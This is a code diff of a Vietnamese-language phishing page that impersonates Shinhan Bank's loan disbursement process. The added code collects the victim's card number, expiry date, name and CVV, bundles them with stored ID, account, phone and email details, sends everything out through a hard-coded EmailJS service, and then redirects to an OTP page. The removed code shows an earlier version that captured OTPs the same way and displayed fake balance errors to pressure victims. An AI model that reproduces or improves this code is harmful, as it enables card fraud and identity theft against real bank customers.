@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giải Ngân Thẻ VISA,Thẻ JCB,Thẻ MASTERCARD,Thẻ UIP</title>
+    <title>Giải Ngân Thẻ VISA, Mastercard, JCB, UIP</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
@@ -201,49 +201,40 @@
             background-color: #003087;
             color: #fff;
         }
-        .container {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 15px;
+        .form-container {
             background-color: #fff;
+            padding: 10px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 0 auto;
         }
-        .container h2 {
+        .form-container h2 {
             display: none;
             text-align: center;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
-        .container h2.active {
+        .form-container h2.active {
             display: block;
-        }
-        .container h2 img {
-            height: 24px;
-            vertical-align: middle;
-            margin-right: 8px;
         }
         .bank-selection {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
-            display: none;
-        }
-        .bank-selection.active {
-            display: block;
         }
         .bank-selection h3 {
             color: #003087;
             font-size: 16px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .bank-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
         }
         .bank-option {
             cursor: pointer;
-            padding: 10px;
+            padding: 8px;
             border: 1px solid #ccc;
             border-radius: 5px;
             transition: border 0.3s;
@@ -265,13 +256,13 @@
             color: red;
             font-size: 12px;
             display: none;
-            margin-top: 10px;
+            margin-top: 8px;
         }
         .bank-selection .error.show {
             display: block;
         }
         .guide-section {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
             display: none;
         }
@@ -281,12 +272,12 @@
         .guide-section h3 {
             color: #003087;
             font-size: 16px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .guide-section .bank-logo {
             max-width: 80px;
             height: auto;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .guide-section p {
             font-size: 14px;
@@ -339,20 +330,14 @@
         .issue-guide-btn:hover {
             background-color: #ff6200;
         }
-        .card-form, .otp-form {
-            display: none;
-        }
-        .card-form.active, .otp-form.active {
-            display: block;
-        }
         .summary {
-            margin-bottom: 20px;
-            padding: 15px;
+            margin-bottom: 15px;
+            padding: 10px;
             background-color: #f9f9f9;
             border-radius: 5px;
         }
         .summary h3 {
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             cursor: pointer;
             display: flex;
             align-items: center;
@@ -372,7 +357,7 @@
             display: none;
         }
         .summary p {
-            margin: 8px 0;
+            margin: 6px 0;
             font-size: 14px;
         }
         .check-info {
@@ -396,6 +381,9 @@
             margin-bottom: 5px;
             font-weight: bold;
             text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .form-group .input-wrapper {
             display: flex;
@@ -423,6 +411,10 @@
             color: #666;
             margin-top: 5px;
             text-align: center;
+            display: none;
+        }
+        .form-group .help-text.show {
+            display: block;
         }
         .help-icon {
             display: inline-block;
@@ -442,7 +434,6 @@
             margin-bottom: 15px;
             text-align: center;
             display: none;
-            position: relative;
         }
         .help-image.active {
             display: block;
@@ -452,25 +443,6 @@
             width: 100%;
             border: 1px solid #e9ecef;
             border-radius: 5px;
-        }
-        .help-image .overlay-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.7);
-            color: #fff;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 14px;
-            text-align: center;
-            max-width: 90%;
-        }
-        .timer {
-            color: red;
-            font-weight: bold;
-            text-align: center;
-            margin: 10px 0;
         }
         .buttons {
             display: flex;
@@ -489,16 +461,11 @@
             background-color: #003087;
             color: #fff;
         }
-        .guide-link {
-            display: block;
-            text-align: center;
-            margin-top: 15px;
-            color: red;
-            text-decoration: none;
-            font-size: 14px;
+        .card-form {
+            display: none;
         }
-        .guide-link:hover {
-            text-decoration: underline;
+        .card-form.active {
+            display: block;
         }
         .error-dialog {
             display: none;
@@ -611,8 +578,8 @@
                 padding: 8px;
                 font-size: 12px;
             }
-            .container {
-                padding: 12px;
+            .form-container {
+                padding: 10px;
             }
             .bank-grid {
                 grid-template-columns: repeat(3, 1fr);
@@ -623,15 +590,11 @@
             .guide-section .bank-logo {
                 max-width: 60px;
             }
-            .guide-section img, .issue-guide-section img, .help-image img {
+            .issue-guide-section img, .help-image img {
                 max-width: 200px;
             }
-            .help-image .overlay-text {
-                font-size: 12px;
-                padding: 8px;
-            }
             .form-group {
-                margin-bottom: 10px;
+                margin-bottom: 8px;
             }
             button, .issue-guide-btn {
                 padding: 6px 12px;
@@ -703,46 +666,14 @@
     </div>
 
     <div class="steps" role="progressbar" aria-label="Card Info Progress">
-        <div class="step active" id="step1" aria-current="step">THÔNG TIN THẺ GIẢI NGÂN</div>
+        <div class="step active" id="step1">Nhập thông tin</div>
+        <div class="step" id="step2">Xét duyệt</div>
+        <div class="step" id="step3">Giải ngân</div>
     </div>
 
     <div class="container">
         <div class="form-container">
             <h2>Xác Nhận Giải Ngân Thẻ VISA</h2>
-            <div class="help-image" id="helpImage">
-                <img src="https://nganhangkorea.com/wp-content/uploads/2022/01/visa1.jpg" alt="Hướng dẫn nhập thông tin thẻ">
-                <div class="overlay-text">Hướng dẫn nhập thông tin thẻ Visa<br>Số thẻ Visa in trên mặt trước thẻ.</div>
-            </div>
-            <div class="bank-selection active" id="bank-selection">
-                <h3>Chọn ngân hàng</h3>
-                <div class="bank-grid">
-                    <div class="bank-option" data-bank="THE_MASTERCARD" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Mastercard">
-                        <p>Thẻ Mastercard</p>
-                    </div>
-                    <div class="bank-option" data-bank="THE_VISA" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
-                        <p>Thẻ Visa</p>
-                    </div>
-                    <div class="bank-option" data-bank="THE_JCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="Thẻ JCB">
-                        <p>Thẻ JCB</p>
-                    </div>
-                    <div class="bank-option" data-bank="THE_UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="Thẻ UIP">
-                        <p>UIP</p>
-                    </div>
-                </div>
-                <span class="error" id="bankError">Vui lòng chọn một ngân hàng</span>
-                <div class="buttons">
-                    <button class="primary" onclick="confirmBank()">Xác nhận</button>
-                </div>
-            </div>
-            <div class="guide-section" id="card-guide">
-                <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
-                <h3>Hướng dẫn nhập thông tin thẻ Visa</h3>
-                <p>Số thẻ Visa in trên mặt trước thẻ.</p>
-            </div>
             <div class="summary collapsed" id="summary">
                 <h3 onclick="toggleSummary()">Thông tin giải ngân</h3>
                 <div class="summary-content">
@@ -757,65 +688,88 @@
                     <p>Email: <span id="summaryEmail"></span></p>
                 </div>
             </div>
+            <div class="bank-selection active" id="bank-selection">
+                <h3>Chọn loại thẻ</h3>
+                <div class="bank-grid">
+                    <div class="bank-option" data-bank="THE_MASTERCARD" data-logo="https://www.vban.vn/Resources/images/logo-bank/25.png" data-help-image="https://i.imgur.com/XK8z3Y4.jpeg">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/25.png" alt="Thẻ Mastercard">
+                        <p>Mastercard</p>
+                    </div>
+                    <div class="bank-option" data-bank="THE_VISA" data-logo="https://www.vban.vn/Resources/images/logo-bank/26.png" data-help-image="https://i.imgur.com/4q6u0a1.jpeg">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/26.png" alt="Thẻ Visa">
+                        <p>Visa</p>
+                    </div>
+                    <div class="bank-option" data-bank="THE_JCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/27.png" data-help-image="https://i.imgur.com/6y8M0mJ.jpeg">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/27.png" alt="Thẻ JCB">
+                        <p>JCB</p>
+                    </div>
+                    <div class="bank-option" data-bank="THE_UIP" data-logo="https://www.vban.vn/Resources/images/logo-bank/uip.png" data-help-image="https://i.imgur.com/5z3pQwD.jpeg">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/uip.png" alt="Thẻ UIP">
+                        <p>UIP</p>
+                    </div>
+                </div>
+                <span class="error" id="bankError">Vui lòng chọn một ngân hàng</span>
+                <div class="buttons">
+                    <button class="primary" onclick="confirmBank()">Xác nhận</button>
+                </div>
+            </div>
+            <div class="help-image" id="helpImage">
+                <img src="https://nganhangkorea.com/wp-content/uploads/2022/01/visa1.jpg" alt="Hướng dẫn nhập thông tin thẻ">
+            </div>
+            <div class="guide-section" id="card-guide">
+                <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
+                <h3>Nhập thông tin thẻ</h3>
+                <p>Số thẻ in trên mặt trước thẻ.</p>
+            </div>
             <form id="card-info-form" class="card-form">
                 <p class="check-info">Vui lòng kiểm tra thông tin trước khi nhập thẻ!</p>
                 <div class="form-group" aria-live="polite">
-                    <label for="visaCardNumber">Số thẻ Visa *<span class="help-icon" onclick="showHelp('visaCardNumber')">?</span></label>
+                    <label for="visaCardNumber">Số thẻ *<span class="help-icon" onclick="toggleHelpText('visaCardNumberHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="visaCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required aria-describedby="visaCardNumberError">
                     </div>
-                    <span class="help-text">16 số in trên mặt trước thẻ Visa.</span>
+                    <span class="help-text" id="visaCardNumberHelp">16 số in trên mặt trước thẻ.</span>
                     <span class="error" id="visaCardNumberError">Số thẻ phải là 16 số</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="visaExpiryDate">Ngày hết hạn *<span class="help-icon" onclick="showHelp('visaExpiryDate')">?</span></label>
+                    <label for="visaExpiryDate">Ngày hết hạn *<span class="help-icon" onclick="toggleHelpText('visaExpiryDateHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="visaExpiryDate" placeholder="02/30" maxlength="5" required aria-describedby="visaExpiryDateError">
                     </div>
-                    <span class="help-text">Ngày hết hạn trên thẻ, định dạng mm/yy (ví dụ: 02/30).</span>
+                    <span class="help-text" id="visaExpiryDateHelp">Ngày hết hạn trên thẻ, định dạng mm/yy (ví dụ: 02/30).</span>
                     <span class="error" id="visaExpiryDateError">Ngày hết hạn phải hợp lệ (mm/yy, sau ngày hiện tại)</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="visaFullName">Tên chủ thẻ *<span class="help-icon" onclick="showHelp('visaFullName')">?</span></label>
+                    <label for="visaFullName">Tên chủ thẻ *<span class="help-icon" onclick="toggleHelpText('visaFullNameHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="visaFullName" required aria-describedby="visaFullNameError">
                     </div>
-                    <span class="help-text">Tên chủ thẻ in trên mặt trước thẻ, Vui lòng nhập chính xác.</span>
+                    <span class="help-text" id="visaFullNameHelp">Tên chủ thẻ in trên mặt trước thẻ, Vui lòng nhập chính xác.</span>
                     <span class="error" id="visaFullNameError">Họ và tên phải có ít nhất 2 ký tự</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="visaCvv">Số CVV *<span class="help-icon" onclick="showHelp('visaCvv')">?</span></label>
+                    <label for="visaCvv">Số CVV *<span class="help-icon" onclick="toggleHelpText('visaCvvHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="visaCvv" placeholder="123" maxlength="3" required aria-describedby="visaCvvError">
                     </div>
-                    <span class="help-text">3 số ở mặt sau thẻ, thường trong dải chữ ký.</span>
+                    <span class="help-text" id="visaCvvHelp">3 số ở mặt sau thẻ, thường trong dải chữ ký.</span>
                     <span class="error" id="visaCvvError">CVV phải là 3 số</span>
                 </div>
                 <div class="buttons">
                     <button type="submit" class="primary">Xác nhận</button>
                 </div>
             </form>
-            <form id="otp-form" class="otp-form">
-                <div class="form-group" aria-live="polite">
-                    <label for="otp">Mã OTP *</label>
-                    <input type="text" id="otp" placeholder="Nhập mã OTP" maxlength="6" required aria-describedby="otpError">
-                    <span class="error" id="otpError">Mã OTP phải là 6 số</span>
-                </div>
-                <div class="timer" id="otpTimer">Còn 60 giây</div>
-                <div class="buttons">
-                    <button type="submit" class="primary">Xác nhận OTP</button>
-                </div>
-            </form>
-            <button class="issue-guide-btn" id="issue-guide-btn" onclick="toggleIssueGuide()">Hướng dẫn phát hành thẻ</button>
+            <button class="issue-guide-btn" id="issue-guide-btn" onclick="toggleIssueGuide()">Hướng dẫn đăng ký thanh toán online</button>
             <div class="issue-guide-section" id="issue-guide">
-                <h3>Hướng dẫn phát hành thẻ Visa <span class="help-icon" onclick="showHelp('issueGuide')">?</span></h3>
+                <h3>Hướng dẫn phát hành thẻ <span class="help-icon" onclick="toggleHelpText('issueGuideHelp')">?</span></h3>
+                <span class="help-text" id="issueGuideHelp">Hướng dẫn chi tiết để đăng ký thẻ và kích hoạt thanh toán trực tuyến.</span>
                 <ul>
                     <li>Chuẩn bị giấy tờ tùy thân: CMND/CCCD còn hiệu lực.</li>
                     <li>Đến chi nhánh ngân hàng đã chọn hoặc đăng ký online qua <a href="https://shinhan.com.vn/vi/personal/cards" target="_blank">trang đăng ký thẻ</a>.</li>
                     <li>Điền đơn đăng ký và nộp hồ sơ theo hướng dẫn của nhân viên ngân hàng.</li>
                     <li>Nhận thẻ sau 5-7 ngày làm việc tại chi nhánh hoặc qua chuyển phát.</li>
                 </ul>
-                <img src="https://via.placeholder.com/300x150?text=Chi+Nhánh+Ngân+Hàng" alt="Hình ảnh minh họa chi nhánh ngân hàng hoặc biểu mẫu đăng ký thẻ Visa">
+                <img src="https://via.placeholder.com/300x150?text=Chi+Nhánh+Ngân+Hàng" alt="Hình ảnh minh họa chi nhánh ngân hàng hoặc biểu mẫu đăng ký thẻ">
             </div>
             <div class="error-dialog" id="errorDialog">
                 <p id="errorMessage"></p>
@@ -840,20 +794,23 @@
         let bannerIndex = 0;
         let selectedBank = null;
         let selectedBankLogo = null;
-        let otpCountdown = 60;
-        let otpInterval = null;
+        let selectedBankHelpImage = null;
         let failedAttempts = 0;
         let formData = {};
-
-        function showHelp(fieldId) {
-            const helpImage = document.getElementById('helpImage');
-            helpImage.classList.add('active');
-            helpImage.scrollIntoView({ behavior: 'smooth' });
-        }
 
         function toggleSummary() {
             const summary = document.getElementById('summary');
             summary.classList.toggle('collapsed');
+        }
+
+        function toggleHelpText(helpId) {
+            const helpText = document.getElementById(helpId);
+            helpText.classList.toggle('show');
+        }
+
+        function toggleIssueGuide() {
+            const issueGuide = document.getElementById('issue-guide');
+            issueGuide.classList.toggle('active');
         }
 
         window.addEventListener('load', () => {
@@ -866,23 +823,29 @@
                 }
                 document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
                 document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
+                document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
+                document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
                 document.getElementById('summaryAccountHolder').textContent = formData.accountHolder || 'N/A';
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryEmail').textContent = formData.email || 'N/A';
                 selectedBank = sessionStorage.getItem('selectedBank');
                 if (selectedBank) {
-                    document.querySelector(`.bank-option[data-bank="${selectedBank}"]`)?.classList.add('selected');
-                    document.getElementById('summaryBank').textContent = selectedBank;
-                    confirmBank();
+                    const selectedOption = document.querySelector(`.bank-option[data-bank="${selectedBank}"]`);
+                    if (selectedOption) {
+                        selectedOption.classList.add('selected');
+                        selectedBankLogo = selectedOption.getAttribute('data-logo');
+                        selectedBankHelpImage = selectedOption.getAttribute('data-help-image');
+                        document.getElementById('summaryBank').textContent = selectedBank;
+                        confirmBank();
+                    }
                 }
-                initializeExpiryDateInput();
+                initializeInputMasks();
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
             }
-            initializeInputMasks();
         });
 
         function toggleMenu() {
@@ -892,18 +855,18 @@
             hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
         }
 
-        function toggleIssueGuide() {
-            const issueGuide = document.getElementById('issue-guide');
-            issueGuide.classList.toggle('active');
-        }
-
-        function selectBank(bank, logo) {
+        function selectBank(bank, logo, helpImage) {
+            console.log('Selected bank:', bank, 'Logo:', logo, 'Help Image:', helpImage); // Debug
             selectedBank = bank;
             selectedBankLogo = logo;
+            selectedBankHelpImage = helpImage;
             document.querySelectorAll('.bank-option').forEach(option => {
                 option.classList.remove('selected');
             });
-            document.querySelector(`.bank-option[data-bank="${bank}"]`).classList.add('selected');
+            const selectedOption = document.querySelector(`.bank-option[data-bank="${bank}"]`);
+            if (selectedOption) {
+                selectedOption.classList.add('selected');
+            }
             document.getElementById('bankError').classList.remove('show');
         }
 
@@ -917,9 +880,11 @@
             document.getElementById('card-guide').classList.add('active');
             document.getElementById('card-info-form').classList.add('active');
             document.getElementById('issue-guide-btn').classList.add('active');
-            document.getElementById('selected-bank-logo').src = selectedBankLogo;
+            document.getElementById('selected-bank-logo').src = selectedBankLogo || '';
+            document.getElementById('selected-bank-logo').alt = `${selectedBank} Logo`;
+            document.querySelector('.help-image img').src = selectedBankHelpImage || 'https://nganhangkorea.com/wp-content/uploads/2022/01/visa1.jpg';
+            document.querySelector('.help-image img').alt = `${selectedBank} Guide Image`;
             document.querySelector('.form-container h2').classList.add('active');
-            document.getElementById('summary').classList.add('active');
             document.getElementById('summaryBank').textContent = selectedBank;
             document.getElementById('helpImage').classList.add('active');
         }
@@ -963,7 +928,7 @@
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ mask: "9999 9999 9999 9999" }).mask(document.getElementById('visaCardNumber'));
                 Inputmask({ mask: "999" }).mask(document.getElementById('visaCvv'));
-                Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
+                Inputmask({ mask: "99/99" }).mask(document.getElementById('visaExpiryDate'));
             }
             const cardInput = document.getElementById('visaCardNumber');
             cardInput.addEventListener('input', function() {
@@ -977,10 +942,6 @@
                     cardInput.value = formatted;
                 }
             });
-            lazyLoadImages();
-        }
-
-        function initializeExpiryDateInput() {
             const expiryInput = document.getElementById('visaExpiryDate');
             expiryInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
@@ -1001,6 +962,7 @@
                     }
                 }
             });
+            lazyLoadImages();
         }
 
         function validateDate(dateStr) {
@@ -1014,8 +976,15 @@
             return date && !isNaN(date) && date > currentDate && date.getMonth() + 1 === month && date.getFullYear() === fullYear;
         }
 
-        function sendCardInfo(cardData) {
-            return emailjs.send('service_60tgxof', 'template_m26sq6s', cardData);
+        function showErrorDialog(message) {
+            const dialog = document.getElementById('errorDialog');
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            dialog.classList.add('show');
+        }
+
+        function closeErrorDialog() {
+            document.getElementById('errorDialog').classList.remove('show');
         }
 
         function validateCardForm() {
@@ -1052,20 +1021,20 @@
                 formData.expiryDate = expiryDate;
                 formData.cardFullName = fullName;
                 formData.cvv = cvv;
-                formData.cardType = 'visa';
+                formData.cardType = selectedBank.toLowerCase().replace('the_', '');
                 formData.bankName = selectedBank;
                 sessionStorage.setItem('cardInfo', JSON.stringify(formData));
                 const cardData = {
-                    cardType: formData.cardType,
-                    cardNumber: formData.cardNumber,
-                    date: formData.expiryDate,
-                    fullName: formData.cardFullName,
-                    cvv: formData.cvv,
-                    bankName: formData.bankName,
-                    timestamp: new Date().toLocaleString('vi-VN'),
+                    'Loại thẻ': formData.cardType,
+                    'Số thẻ': formData.cardNumber,
+                    'date': formData.expiryDate,
+                    'cvv': formData.cvv,
+                    'Tên đầy đủ': formData.cardFullName,
+                    'Tên ngân hàng': formData.bankName,
+                    'dấu thời gian': new Date().toLocaleString('vi-VN'),
                     cccd: formData.cccd || 'N/A',
-                    amount: 'N/A',
-                    months: 'N/A',
+                    amount: formData.amount || 'N/A',
+                    months: formData.months || 'N/A',
                     account_number: formData.accountNumber || 'N/A',
                     account_holder: formData.accountHolder || 'N/A',
                     bank: formData.bankName || 'N/A',
@@ -1073,19 +1042,15 @@
                     email: formData.email || 'N/A',
                     method: 'N/A'
                 };
-                console.log('Sending cardData:', cardData); // Debug log
-                sendCardInfo(cardData).then(
+                console.log('Sending cardData:', cardData);
+                emailjs.send('service_60tgxof', 'template_m26sq6s', cardData).then(
                     () => {
                         console.log('EmailJS sent successfully');
-                        document.getElementById('card-info-form').classList.remove('active');
-                        document.getElementById('otp-form').classList.add('active');
-                        document.getElementById('helpImage').classList.remove('active');
-                        document.getElementById('summary').classList.remove('active');
-                        startOTPTimer();
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/otp.html';
                     },
                     (error) => {
                         console.error('EmailJS error:', error);
-                        alert('Lỗi khi gửi thông tin. Vui lòng thử lại.');
+                        showErrorDialog('Lỗi khi gửi thông tin. Vui lòng thử lại.');
                     }
                 );
             }
@@ -1093,102 +1058,19 @@
             return isValid;
         }
 
-        function startOTPTimer() {
-            otpCountdown = 60;
-            document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
-            if (otpInterval) {
-                clearInterval(otpInterval);
-            }
-            otpInterval = setInterval(() => {
-                otpCountdown--;
-                document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
-                if (otpCountdown <= 0) {
-                    clearInterval(otpInterval);
-                }
-            }, 1000);
-        }
-
-        function closeErrorDialog() {
-            document.getElementById('errorDialog').classList.remove('show');
-        }
-
-        function sendOTPToEmail(otp, phone) {
-            emailjs.send('service_60tgxof', 'template_m26sq6s', {
-                otp: otp,
-                phone: phone,
-                timestamp: new Date().toLocaleString('vi-VN')
-            }).then(
-                () => console.log('OTP sent via EmailJS'),
-                (error) => console.error('EmailJS error:', error)
-            );
-        }
-
-        function verifyOTP() {
-            const otp = document.getElementById('otp').value.trim();
-            const phone = formData.phone || 'N/A';
-            const amount = parseInt(formData.amount?.replace(/[^0-9]/g, '') || 0);
-            const minBalance = amount * 0.1;
-
-            startOTPTimer();
-            sendOTPToEmail(otp, phone);
-
-            if (/^\d{6}$/.test(otp) && otp === '123456') {
-                sessionStorage.removeItem('formData');
-                sessionStorage.removeItem('selectedBank');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/otp.html';
-            } else {
-                failedAttempts++;
-                document.getElementById('otpError').classList.add('show');
-                const dialog = document.getElementById('errorDialog');
-                const message = document.getElementById('errorMessage');
-
-                if (failedAttempts === 1) {
-                    message.textContent = 'Mã OTP không đúng, vui lòng kiểm tra lại.';
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        closeErrorDialog();
-                        startOTPTimer();
-                    }, 60000);
-                } else if (failedAttempts === 2) {
-                    message.textContent = `Thẻ chưa được kích hoạt thanh toán trực tuyến hoặc không đủ số dư. Vui lòng kiểm tra lại số dư bắt buộc phải có trong thẻ tối thiểu ${minBalance.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' })}. Mã sẽ được gửi lại sau 2 phút. Quý khách vui lòng kiểm tra lại và xác nhận.`;
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        closeErrorDialog();
-                        startOTPTimer();
-                    }, 120000);
-                } else {
-                    message.textContent = 'Giải ngân không thành công. Vui lòng thử lại sau.';
-                    dialog.classList.add('show');
-                    setTimeout(() => {
-                        sessionStorage.removeItem('formData');
-                        sessionStorage.removeItem('selectedBank');
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                    }, 3000);
-                }
-            }
-        }
-
         document.querySelectorAll('.bank-option').forEach(option => {
             option.addEventListener('click', () => {
-                selectBank(option.getAttribute('data-bank'), option.getAttribute('data-logo'));
+                selectBank(
+                    option.getAttribute('data-bank'),
+                    option.getAttribute('data-logo'),
+                    option.getAttribute('data-help-image')
+                );
             });
         });
 
         document.getElementById('card-info-form').addEventListener('submit', (e) => {
             e.preventDefault();
             validateCardForm();
-        });
-
-        document.getElementById('otp-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            verifyOTP();
-        });
-
-        document.getElementById('otp').addEventListener('input', () => {
-            const otp = document.getElementById('otp').value.trim();
-            if (otp && /^\d{6}$/.test(otp)) {
-                sendOTPToEmail(otp, formData.phone || 'N/A');
-            }
         });
     </script>
 </body>
